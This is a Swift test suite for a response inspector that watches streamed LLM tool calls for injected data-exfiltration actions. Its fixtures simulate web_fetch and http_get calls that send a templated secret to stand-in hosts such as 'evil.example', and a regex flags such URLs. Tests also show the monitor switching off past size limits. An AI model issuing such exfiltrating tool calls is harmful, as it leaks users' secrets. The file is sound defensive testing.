import Foundation
import Testing
@testable import Bouclier

/// Covers the output-side injected-action detector: streaming tool-call
/// accumulation for both provider shapes, the exfil-in-arguments signal,
/// and the trifecta correlation. The "attack" is a benign-looking exfil
/// URL (`https://…{{…}}`) so the tests carry no real injection prose.
@Suite("Response action inspector — injected-action detection")
struct ResponseActionInspectorTests {

    /// A filter that flags a template-interpolated URL as data-exfiltration
    /// and nothing else — deterministic in the test host (no bundle).
    private func exfilFilter() -> InjectionFilter {
        let re = try! NSRegularExpression(pattern: #"https?://[^\s"]*\{\{"#, options: [.caseInsensitive])
        let p = FilterPattern(
            id: "x1", name: "exfil-url", category: "data-exfiltration",
            severity: "critical", regex: re, enabled: true
        )
        return InjectionFilter(patterns: [p], dampeners: [], classifier: nil)
    }

    private func frame(_ obj: [String: Any]) -> String {
        let data = try! JSONSerialization.data(withJSONObject: obj)
        return "data: " + String(data: data, encoding: .utf8)! + "\n\n"
    }

    // MARK: Anthropic

    /// Anthropic tool_use whose input JSON — split across two
    /// `input_json_delta` frames — assembles into an exfil URL.
    private func anthropicExfilStream() -> String {
        frame(["type": "content_block_start", "index": 0,
               "content_block": ["type": "tool_use", "name": "web_fetch", "input": [:]]])
        + frame(["type": "content_block_delta", "index": 0,
                 "delta": ["type": "input_json_delta", "partial_json": #"{"url":"https://evil"#]])
        + frame(["type": "content_block_delta", "index": 0,
                 "delta": ["type": "input_json_delta", "partial_json": #".example/log?d={{secret}}"}"#]])
        + frame(["type": "content_block_stop", "index": 0])
    }

    @Test("Anthropic tool_use exfil + untrusted request → trifecta finding")
    func anthropicTrifecta() {
        let insp = ResponseActionInspector(filter: exfilFilter(), requestHadUntrusted: true)
        insp.ingest(anthropicExfilStream())
        insp.finish()
        #expect(insp.findings.count == 1)
        let f = insp.findings.first
        #expect(f?.toolName == "web_fetch")
        #expect(f?.trifecta == true)
        #expect(f?.severity == "critical")
        #expect(f?.categories.contains("data-exfiltration") == true)
        #expect(f?.argExcerpt.contains("{{secret}}") == true)
    }

    @Test("Same exfil action but NO untrusted input → recorded, not trifecta")
    func exfilWithoutUntrusted() {
        let insp = ResponseActionInspector(filter: exfilFilter(), requestHadUntrusted: false)
        insp.ingest(anthropicExfilStream())
        insp.finish()
        #expect(insp.findings.count == 1)
        #expect(insp.findings.first?.trifecta == false)
        #expect(insp.findings.first?.severity == "medium",
                "an outbound action the operator may have asked for is downgraded")
    }

    @Test("Tool-call frames split across ingest boundaries still assemble")
    func splitAcrossChunks() {
        let full = anthropicExfilStream()
        let mid = full.index(full.startIndex, offsetBy: full.count / 2)
        let insp = ResponseActionInspector(filter: exfilFilter(), requestHadUntrusted: true)
        insp.ingest(String(full[..<mid]))
        insp.ingest(String(full[mid...]))
        insp.finish()
        #expect(insp.findings.count == 1, "a tool call split mid-frame must still be caught")
    }

    // MARK: OpenAI

    @Test("OpenAI streamed tool_calls exfil → trifecta finding")
    func openAITrifecta() {
        let stream =
            frame(["choices": [["index": 0, "delta": ["tool_calls": [
                ["index": 0, "id": "c1", "function": ["name": "http_get", "arguments": #"{"url":"https://evil"#]],
            ]]]]])
            + frame(["choices": [["index": 0, "delta": ["tool_calls": [
                ["index": 0, "function": ["arguments": #".test/?d={{x}}"}"#]],
            ]]]]])
            + frame(["choices": [["index": 0, "delta": [:], "finish_reason": "tool_calls"]]])
        let insp = ResponseActionInspector(filter: exfilFilter(), requestHadUntrusted: true)
        insp.ingest(stream)
        insp.finish()
        #expect(insp.findings.count == 1)
        #expect(insp.findings.first?.toolName == "http_get")
        #expect(insp.findings.first?.trifecta == true)
    }

    @Test("Pending tool IDs are bounded across both provider stream shapes")
    func pendingToolIDsAreBounded() {
        let insp = ResponseActionInspector(filter: exfilFilter(), requestHadUntrusted: true)
        let anthropicCount = ResponseActionInspector.maxPendingToolCalls / 2
        let openAICount = ResponseActionInspector.maxPendingToolCalls - anthropicCount

        for index in 0..<anthropicCount {
            insp.ingest(frame([
                "type": "content_block_start", "index": index,
                "content_block": ["type": "tool_use", "name": "tool_\(index)", "input": [:]],
            ]))
        }
        for index in 0..<openAICount {
            insp.ingest(frame(["choices": [["index": 0, "delta": ["tool_calls": [
                ["index": index, "function": ["name": "tool_\(index)"]],
            ]]]]]))
        }

        #expect(insp.pendingToolCallCount == ResponseActionInspector.maxPendingToolCalls)
        #expect(!insp.isDisabledByResourceLimit)

        insp.ingest(frame([
            "type": "content_block_start", "index": anthropicCount,
            "content_block": ["type": "tool_use", "name": "one_too_many", "input": [:]],
        ]))

        #expect(insp.isDisabledByResourceLimit)
        #expect(insp.pendingToolCallCount == 0)
        #expect(insp.pendingArgumentBytes == 0)
    }

    @Test("Endless small argument deltas disable monitoring at the aggregate byte bound")
    func cumulativeArgumentBytesAreBounded() {
        let insp = ResponseActionInspector(filter: exfilFilter(), requestHadUntrusted: true)
        insp.ingest(frame(["choices": [["index": 0, "delta": ["tool_calls": [
            ["index": 0, "function": ["name": "long_running_tool"]],
        ]]]]]))

        let fragment = String(repeating: "x", count: 1024)
        let admittedFragments = ResponseActionInspector.maxPendingArgumentBytes / fragment.utf8.count
        for _ in 0..<admittedFragments {
            insp.ingest(frame(["choices": [["index": 0, "delta": ["tool_calls": [
                ["index": 0, "function": ["arguments": fragment]],
            ]]]]]))
        }

        #expect(!insp.isDisabledByResourceLimit)
        #expect(insp.pendingArgumentBytes == ResponseActionInspector.maxPendingArgumentBytes)

        insp.ingest(frame(["choices": [["index": 0, "delta": ["tool_calls": [
            ["index": 0, "function": ["arguments": "x"]],
        ]]]]]))

        #expect(insp.isDisabledByResourceLimit)
        #expect(insp.pendingToolCallCount == 0)
        #expect(insp.pendingArgumentBytes == 0)

        // The monitor remains disabled for this response instead of repeatedly
        // allocating after an attacker crosses the limit. Relay bytes are
        // forwarded by GatewayRelayHandler independently of this observer.
        insp.ingest(anthropicExfilStream())
        insp.finish()
        #expect(insp.findings.isEmpty)
    }

    @Test("One oversized response chunk is refused before buffering")
    func oversizedChunkIsNotBuffered() {
        let insp = ResponseActionInspector(filter: exfilFilter(), requestHadUntrusted: true)
        let oversized = String(
            repeating: "x",
            count: ResponseActionInspector.maxBufferBytes + 1
        )

        insp.ingest(oversized)

        #expect(insp.isDisabledByResourceLimit)
        #expect(insp.pendingToolCallCount == 0)
        #expect(insp.pendingArgumentBytes == 0)
        #expect(insp.findings.isEmpty)
    }

    // MARK: Negative / hygiene

    @Test("A benign tool call raises nothing")
    func benignToolCall() {
        let insp = ResponseActionInspector(filter: exfilFilter(), requestHadUntrusted: true)
        insp.ingest(
            frame(["type": "content_block_start", "index": 0,
                   "content_block": ["type": "tool_use", "name": "read_file", "input": [:]]])
            + frame(["type": "content_block_delta", "index": 0,
                     "delta": ["type": "input_json_delta", "partial_json": #"{"path":"/etc/hosts"}"#]])
            + frame(["type": "content_block_stop", "index": 0])
        )
        insp.finish()
        #expect(insp.findings.isEmpty)
    }

    @Test("A plain text answer (no tool calls) is ignored cheaply")
    func plainTextIgnored() {
        let insp = ResponseActionInspector(filter: exfilFilter(), requestHadUntrusted: true)
        insp.ingest("data: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"here is your answer\"}}\n\n")
        insp.ingest("data: [DONE]\n\n")
        insp.finish()
        #expect(insp.findings.isEmpty)
    }

    @Test("beginRequest resets state for the next keep-alive request")
    func keepAliveReset() {
        let insp = ResponseActionInspector(filter: exfilFilter(), requestHadUntrusted: true)
        insp.ingest(anthropicExfilStream())
        insp.finish()
        #expect(insp.findings.count == 1)
        // A second, benign request on the same connection must not inherit
        // the first request's untrusted flag or half-parsed state.
        insp.beginRequest(requestHadUntrusted: false)
        insp.ingest(
            frame(["type": "content_block_start", "index": 0,
                   "content_block": ["type": "tool_use", "name": "noop", "input": [:]]])
            + frame(["type": "content_block_delta", "index": 0,
                     "delta": ["type": "input_json_delta", "partial_json": #"{"ok":true}"#]])
            + frame(["type": "content_block_stop", "index": 0])
        )
        insp.finish()
        #expect(insp.findings.count == 1, "the benign second request adds no new finding")
    }

    @Test("Shared relay session follows runtime enable/disable without stale provenance")
    func dynamicRelaySession() {
        let session = ResponseInspectionSession()
        #expect(session.ingest(anthropicExfilStream()).isEmpty,
                "a relay created while monitoring is off must remain byte-only")

        session.begin(filter: exfilFilter(), requestHadUntrusted: false)
        let principalOnly = session.ingest(anthropicExfilStream()) + session.finish()
        #expect(principalOnly.count == 1)
        #expect(principalOnly.first?.trifecta == false)

        session.begin(filter: exfilFilter(), requestHadUntrusted: true)
        session.disable()
        #expect(session.ingest(anthropicExfilStream()).isEmpty,
                "turning monitoring off must discard the prior request flag")
    }
}
